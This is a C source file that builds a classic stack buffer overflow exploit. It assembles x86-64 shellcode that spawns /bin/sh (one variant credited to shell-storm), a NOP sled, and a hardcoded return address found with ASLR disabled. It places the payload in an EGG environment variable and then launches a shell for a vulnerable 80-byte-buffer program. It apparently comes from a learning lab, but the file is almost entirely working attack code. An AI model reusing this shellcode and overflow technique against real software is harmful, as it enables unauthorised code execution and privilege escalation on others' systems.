#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP 0x90

char shellcode[] = "\xeb\x1b"			//jmp    40009d <_start+0x1d>
	"\x48\x31\xc0"						//xor    %rax,%rax
	"\x50"								//push   %rax
	"\x5a"								//pop    %rdx
	"\x5f"								//pop    %rdi
	"\x50"								//push   %rax
	"\x48\x89\xf8"						//mov    %rdi,%rax
	"\x50"								//push   %rax
	"\x54"								//push   %rsp
	"\x5e"								//pop    %rsi
	"\x48\x31\xc0"						//xor    %rax,%rax
	"\xb0\x3b"							//mov    $0x3b,%al
	"\x0f\x05"							//syscall 
	"\x48\x31\xc0"						//xor    %rax,%rax
	"\xb0\x3c"							//mov    $0x3c,%al
	"\x0f\x05"							//syscall 
	"\xe8\xe0\xff\xff\xff"				//callq  400082 <_start+0x2>
	"\x2f"								//(bad)  
	"\x62"								//(bad)  
	"\x69"								//.byte 0x69
	"\x6e"								//outsb  %ds:(%rsi),(%dx)
	"\x2f"								//(bad)  
	"\x73\x68";							//jae    400111 <_start+0x91>

char hello_world_code[] = "\xeb\x1a"	//jmp    40009c <_start+0x1c>
	"\x48\x31\xc0"						//xor    %rax,%rax
	"\xb0\x01"							//mov    $0x1,%al
	"\x48\x31\xff"						//xor    %rdi,%rdi
	"\x40\xb7\x01"						//mov    $0x1,%dil
	"\x5e"								//pop    %rsi
	"\x48\x31\xd2"						//xor    %rdx,%rdx
	"\xb2\x0f"							//mov    $0xf,%dl
	"\x0f\x05"							//syscall 
	"\x48\x31\xc0"						//xor    %rax,%rax
	"\xb0\x3c"							//mov    $0x3c,%al
	"\x0f\x05"							//syscall 
	"\xe8\xe1\xff\xff\xff"				//callq  400082 <_start+0x2>
	"\x48\x61"							//rex.W (bad) 
	"\x63\x6b\x65"						//movslq 0x65(%rbx),%ebp
	"\x64"								//fs
	"\x21";								//.byte 0x21

// shellcode from http://shell-storm.org/shellcode/files/shellcode-106.php

char short_shellcode[] = "\x48\x31\xc0"          // xor    %rax,%rax
    "\x99"                                       // cltd
    "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"   // mov $0x68732f6e69622fff,%rdi
    "\xb0\x3b"                                   // mov    $0x3b,%al
    "\x48\xc1\xef\x08"                           // shr    $0x8,%rdi
    "\x57"                                       // push   %rdi
    "\x48\x89\xe7"                               // mov    %rsp,%rdi
    "\x57"                                       // push   %rdi
    "\x52"                                       // push   %rdx
    "\x48\x89\xe6"                               // mov    %rsp,%rsi
    "\x0f\x05";                                  // syscall

// address of buffer on system found to be - 0x7fffffffdbd0 (ASLR was disabled)
// address is written in the Little Endian format
char retaddr[] = "\xd0\xdb\xff\xff\xff\x7f";

int main(int argc, char **argv) {

	// buffer (in the vulnerable program) is 80 bytes,
	// so the stack looks like this
	// -----------------------------------------------------------------
	// |argv -  | argc -  | Buffer -     | int i - | RBP -   | RET -   |
	// |8 bytes | 4 bytes | 80 bytes     | 4 bytes | 8 bytes | 8 bytes |
	// -----------------------------------------------------------------
	// We will replace the contents of the stack from buffer 
	// and overwrite the return address so that it points to 
	// the address of buffer.
	// --------------------------------------------------------
	// | Shellcode padded      | PTR to shell        |NULL    |
	// | with NOP - 84 bytes   | code - 8 bytes      |4 bytes |
	// --------------------------------------------------------
	
	char buffer[120];

	// fill the buffer with NOP instructions
	memset(buffer, NOP, sizeof(buffer));
	// set the first 4 bytes to EGG=
	memcpy(buffer, "EGG=", 4);
	// set shellcode to EGG
	switch(argv[1][0]) {
		case '1': 
			memcpy(buffer+4, hello_world_code, strlen(hello_world_code));
			break;
		case '2': 
			memcpy(buffer+4, short_shellcode, strlen(short_shellcode));
			break;
		default: 
			memcpy(buffer+4, shellcode, strlen(shellcode));
	}
	// fill the return address which from 88
	memcpy(buffer+108, retaddr, 6);
	// pad \x00\x00 to address which was 6 bytes.
	memcpy(buffer+114, "\x00\x00", 2); 
	// fill NULL at the end of the shellcode
	memcpy(buffer+116, "\x00\x00\x00\x00", 4);

	/*int i;
	for (i = 4; i < 108; i++) {
		printf("%2x ", buffer[i]);
	}
	printf("\n");*/

	putenv(buffer);

	system("/bin/sh");

	return 0;
}
